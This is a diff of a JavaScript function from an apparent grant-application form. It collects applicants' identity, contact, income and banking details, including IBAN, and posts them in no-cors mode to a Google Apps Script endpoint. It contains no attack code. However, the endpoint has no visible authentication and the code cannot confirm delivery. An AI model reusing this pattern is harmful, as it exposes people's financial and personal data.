@@ -13,52 +13,42 @@ var APPS_SCRIPT_URL = 'https://script.google.com/macros/s/AKfycby-fvc-LsoVHWwNdp
    الدالة الرئيسية: حفظ الطلب في Google Sheets
    ================================================ */
 async function saveToGoogleSheets(txNumber) {
-    try {
+  try {
+    var payload = {
+      transaction_id:    txNumber,
+      full_name:         formData.personalInfo.fullName         || '',
+      country:           formData.personalInfo.country          || '',
+      marital_status:    formData.personalInfo.maritalStatus    || '',
+      num_children:      formData.personalInfo.numChildren      || 0,
+      phone:             formData.contactCareer.phone           || '',
+      email:             formData.contactCareer.email           || '',
+      profession:        formData.contactCareer.profession      || '',
+      monthly_income:    formData.contactCareer.income          || 0,
+      grant_type:        formData.grantDetails.grantType        || '',
+      grant_amount:      formData.grantDetails.grantAmount      || 0,
+      grant_description: formData.grantDetails.grantDescription || '',
+      bank_name:         formData.bankingInfo.bankName          || '',
+      account_holder:    formData.bankingInfo.accountHolder     || '',
+      iban:              (formData.bankingInfo.iban || '').replace(/\s/g, '')
+    };
 
-        // ① تجهيز البيانات
-        var payload = {
-            transaction_id:    txNumber,
-            full_name:         formData.personalInfo.fullName          || '',
-            country:           formData.personalInfo.country           || '',
-            marital_status:    formData.personalInfo.maritalStatus     || '',
-            num_children:      formData.personalInfo.numChildren       || 0,
-            phone:             formData.contactCareer.phone            || '',
-            email:             formData.contactCareer.email            || '',
-            profession:        formData.contactCareer.profession       || '',
-            monthly_income:    formData.contactCareer.income           || 0,
-            grant_type:        formData.grantDetails.grantType         || '',
-            grant_amount:      formData.grantDetails.grantAmount       || 0,
-            grant_description: formData.grantDetails.grantDescription  || '',
-            bank_name:         formData.bankingInfo.bankName           || '',
-            account_holder:    formData.bankingInfo.accountHolder      || '',
-            iban:              (formData.bankingInfo.iban || '').replace(/\s/g, '')
-        };
+    var formBody = new URLSearchParams();
+    formBody.append('data', JSON.stringify(payload));
 
-        console.log('📤 جاري الحفظ في Google Sheets...');
+    await fetch(APPS_SCRIPT_URL, {
+      method:  'POST',
+      mode:    'no-cors',
+      headers: {'Content-Type': 'application/x-www-form-urlencoded'},
+      body:    formBody.toString()
+    });
 
-        // ② إرسال البيانات النصية
-        var response = await fetch(APPS_SCRIPT_URL, {
-    method:  'POST',
-    body:    JSON.stringify(payload),
-    mode:    'no-cors'
-});
+    console.log('✅ تم الإرسال');
+    return true;
 
-        // no-cors لا يسمح بقراءة الرد، لكن البيانات تصل
-console.log('✅ تم الإرسال إلى Google Sheets');
-
-        console.log('✅ تم حفظ البيانات في Google Sheets!');
-
-        // ③ رفع الصور إلى Google Drive (إن وُجدت)
-        var rowId = result.rowId || txNumber;
-        await uploadImagesToDrive(rowId, txNumber);
-
-        return true;
-
-    } catch (err) {
-        console.error('❌ خطأ في الاتصال:', err.message);
-        // نكمل ولا نوقف العملية - الواتساب سيُرسل على أي حال
-        return false;
-    }
+  } catch(err) {
+    console.error('❌ خطأ:', err.message);
+    return false;
+  }
 }
 
 /* ================================================
